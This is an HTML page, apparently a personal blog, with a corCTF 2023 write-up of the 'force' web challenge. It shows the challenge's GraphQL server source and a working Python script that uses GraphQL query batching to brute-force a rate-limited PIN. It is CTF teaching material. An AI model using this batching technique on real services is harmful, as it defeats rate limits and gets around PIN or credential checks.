@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="corCTF 2023Web&#x2F;forceChallenge OverviewDescription: Unbreakable vault door!  We have been given a website with a query in it. So first let’s see the source code given. 1234567891011121314151617181">
+<meta property="og:type" content="article">
+<meta property="og:title" content="corCTF 2023 Writeup">
+<meta property="og:url" content="http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/index.html">
+<meta property="og:site_name" content="j4ck4l&#39;s Blog">
+<meta property="og:description" content="corCTF 2023Web&#x2F;forceChallenge OverviewDescription: Unbreakable vault door!  We have been given a website with a query in it. So first let’s see the source code given. 1234567891011121314151617181">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/corctf23/index.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/corctf23/reference.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/corctf23/flag.png">
+<meta property="article:published_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:modified_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:author" content="j4ck4l">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://j4ck4l-24.github.io/images/corctf23/index.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>corCTF 2023 Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/14/UMassCTF24_Writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&text=corCTF 2023 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&is_video=false&description=corCTF 2023 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=corCTF 2023 Writeup&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&name=corCTF 2023 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&t=corCTF 2023 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#corCTF-2023"><span class="toc-number">1.</span> <span class="toc-text">corCTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-force"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        corCTF 2023 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">j4ck4l</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-14T10:20:19.793Z" class="dt-published" itemprop="datePublished">2024-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="corCTF-2023"><a href="#corCTF-2023" class="headerlink" title="corCTF 2023"></a>corCTF 2023</h1><h1 id="Web-force"><a href="#Web-force" class="headerlink" title="Web&#x2F;force"></a>Web&#x2F;force</h1><h2 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h2><p><code>Description</code>: Unbreakable vault door!</p>
+<p><img src="/./images/corctf23/index.png" alt="Index"></p>
+<p>We have been given a website with a query in it.</p>
+<p>So first let’s see the source code given.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fastify <span class="keyword">from</span> <span class="string">&#x27;fastify&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> mercurius <span class="keyword">from</span> <span class="string">&#x27;mercurius&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; randomInt &#125; <span class="keyword">from</span> <span class="string">&#x27;crypto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; readFile &#125; <span class="keyword">from</span> <span class="string">&#x27;fs/promises&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">fastify</span>(&#123;</span><br><span class="line">    <span class="attr">logger</span>: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> index = <span class="keyword">await</span> <span class="title function_">readFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="title function_">randomInt</span>(<span class="number">0</span>, <span class="number">10</span> ** <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> requests = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> requests = <span class="number">10</span>, <span class="number">60000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> app.<span class="title function_">register</span>(mercurius, &#123;</span><br><span class="line">    <span class="attr">schema</span>: <span class="string">`type Query &#123;</span></span><br><span class="line"><span class="string">        flag(pin: Int): String</span></span><br><span class="line"><span class="string">    &#125;`</span>,</span><br><span class="line">    <span class="attr">resolvers</span>: &#123;</span><br><span class="line">        <span class="title class_">Query</span>: &#123;</span><br><span class="line">            <span class="attr">flag</span>: <span class="function">(<span class="params">_, &#123; pin &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (pin !== secret) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Wrong!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;corctf&#123;REDACTED&#125;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">routes</span>: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>).<span class="title function_">send</span>(index);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (requests &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;no u&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    requests--;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">graphql</span>(req.<span class="property">body</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(&#123; <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="attr">port</span>: <span class="number">4020</span> &#125;);</span><br></pre></td></tr></table></figure>
+<p>So it generates a random integer named <code>secret</code> from 0 to 100000 and if we send the query in the given format with pin matching the secret it will give us the flag but the problem is there are 100000 possibilities and we can’t bruteforce also because we can send only 10 request per 60 seconds.</p>
+<h2 id="Vulnerability-Identification"><a href="#Vulnerability-Identification" class="headerlink" title="Vulnerability Identification"></a>Vulnerability Identification</h2><p>So we have to find a way in which we can send different pins multiple times in the 1 post request.</p>
+<p>There is a technique named <code>graphql-batching-attack</code> in which we can send multiple query in 1 post request as given below in image.</p>
+<p><img src="/./images/corctf23/reference.png" alt="Reference"></p>
+<p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/graphql-batching-attack/">Reference</a></p>
+<h2 id="Exploiting-the-Vulnerability"><a href="#Exploiting-the-Vulnerability" class="headerlink" title="Exploiting the Vulnerability"></a>Exploiting the Vulnerability</h2><p>So to exploit it we will be sending the query with 30000 flags each time with the below given python sctipt.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain;charset=UTF-8&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;https://web-force-force-a2e5f8d6b3c3a1f9.be.ax/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    query = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;trying from <span class="subst">&#123;i * <span class="number">30000</span>&#125;</span> to <span class="subst">&#123;(i + <span class="number">1</span>) * <span class="number">30000</span> - <span class="number">1</span>&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(i * <span class="number">30000</span>, (i + <span class="number">1</span>) * <span class="number">30000</span>):</span><br><span class="line">        query += <span class="string">f&#x27;flag<span class="subst">&#123;x&#125;</span> : flag(pin: <span class="subst">&#123;x&#125;</span>)\n&#x27;</span></span><br><span class="line">    response = requests.post(url, headers=headers, data=<span class="string">f&#x27;&#123;&#123;<span class="subst">&#123;query&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;corctf&#123;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        flag = re.search(<span class="string">r&#x27;corctf\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found flag on : <span class="subst">&#123;flag.group(<span class="number">0</span>)&#125;</span>&quot;</span>) </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Obtaining-the-Flag"><a href="#Obtaining-the-Flag" class="headerlink" title="Obtaining the Flag"></a>Obtaining the Flag</h2><p>Hence after running the script we get the flag</p>
+<p><img src="/./images/corctf23/flag.png" alt="Flag"> </p>
+<p>Flag: <strong>corctf{S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S}</strong></p>
+<p>Thank You</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#corCTF-2023"><span class="toc-number">1.</span> <span class="toc-text">corCTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-force"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&text=corCTF 2023 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&is_video=false&description=corCTF 2023 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=corCTF 2023 Writeup&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&title=corCTF 2023 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&name=corCTF 2023 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/corCTF23_Web_Writeup/&t=corCTF 2023 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    حقوق النشر &copy;
+    
+    
+    2024
+    j4ck4l
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
